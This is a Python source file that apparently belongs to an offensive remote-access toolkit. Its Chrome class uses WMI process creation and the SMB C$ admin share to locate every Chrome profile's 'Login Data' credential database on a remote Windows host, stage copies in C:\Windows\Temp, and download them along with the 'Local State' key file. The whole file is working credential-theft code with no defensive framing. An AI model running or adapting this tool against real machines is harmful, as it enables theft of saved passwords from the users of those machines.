from ..target import Target


from typing import List
import time
import os
import ntpath
import tempfile

class Chrome:
    """
    Chrome class
    """
    OUT_DIR = "./chrome"
    REMOTE_SHARE = "C$"
    REMOTE_LOGIN_DATA = "C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\{profile}\\Login Data"
    TMP_FILE = next(tempfile._get_candidate_names())
    REMOTE_WMI_TEMP_FILE = f"C:\\Windows\\Temp\\{TMP_FILE}"
    REMOTE_SMB_TEMP_FILE = f"\\Windows\\Temp\\{TMP_FILE}"
    
    
    def __init__(self, target: Target) -> None:
        self._target = target
        self._target.smb.use_share("C$")
    
    @property
    def _connected(self) -> bool:
        """
        DPAPI handler will only work if there is WMI + SMB connection established

        Returns:
            bool: returns true if can pressed
        """
        return self._target.wmi._connected and self._target.smb._connected
    
    def _copy_remote_login_to_tmpfile(self, files: List[str]):
        self._target.smb.use_share("C$")
        for file in files:
            self._target._console.print(file)
            self._target.wmi.create_process(f"""cmd /c copy "{file}" "{self.REMOTE_WMI_TEMP_FILE}" """)
            time.sleep(0.5)
            self._target.smb.download_file(self.REMOTE_SMB_TEMP_FILE)
            tmp = file.split("\\")
            new = f"{tmp[-2]}  {tmp[-1]}".replace(" ", "_")
            time.sleep(0.5)
            os.rename(self.TMP_FILE, f"{self.OUT_DIR}/{new}")
    
    
    def _get_all_chrome_profiles(self, user):
        x = """powershell -noni -nop -w 1 -c "dir 'C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\{profile}\\Login Data' | Select FullName" """.format(user=user, profile="*")
        x += f"> {self.REMOTE_WMI_TEMP_FILE}"
        self._target._console.print(x)
        self._target.wmi.create_process(x)
        time.sleep(2)
        self._target.smb.download_file(self.REMOTE_SMB_TEMP_FILE)
        with open(self.TMP_FILE, "rb") as f:
            data = f.read().decode("utf-16")
        time.sleep(0.5)
        os.remove(self.TMP_FILE)
        chrome_files = []
        for line in data.splitlines():
            if line.startswith("C:"):
                chrome_files.append(line)
        return chrome_files

    def dump(self, user: str):
        if not os.path.exists(self.OUT_DIR):
            os.mkdir(self.OUT_DIR)
        self._target._console.log("fetching profiels...")
        profiles = self._get_all_chrome_profiles(user)
        self._target._console.log("downloading chrome credential files...")
        self._copy_remote_login_to_tmpfile(profiles)
        self._target._console.log("downloading local state...")
        ls = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
        self._target.wmi.create_process(f"""cmd /c copy "{ls}" "{self.REMOTE_WMI_TEMP_FILE}" """)
        time.sleep(0.5)
        self._target.smb.download_file(self.REMOTE_SMB_TEMP_FILE)
        os.rename(self.TMP_FILE, f"{self.OUT_DIR}/Local_State")
        self._target._console.print("[green]done[/green]")